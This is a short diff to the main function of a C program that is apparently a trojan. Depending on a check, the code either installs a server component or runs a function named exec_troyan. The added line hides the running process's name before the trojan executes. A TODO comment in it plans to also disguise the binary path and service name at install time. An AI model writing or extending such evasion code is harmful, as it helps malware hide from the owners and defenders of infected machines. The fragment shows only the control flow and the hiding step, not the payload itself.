@@ -84,6 +84,7 @@ int main(int argc, char **argv)
 	if (need_to_install_server()) {
 		install_server(argc, argv);
 	} else {
+		hide_process_name(argv); //TODO maybe change more things, like bin path and service name during install???
 		exec_troyan();
 	}
 	return (0);
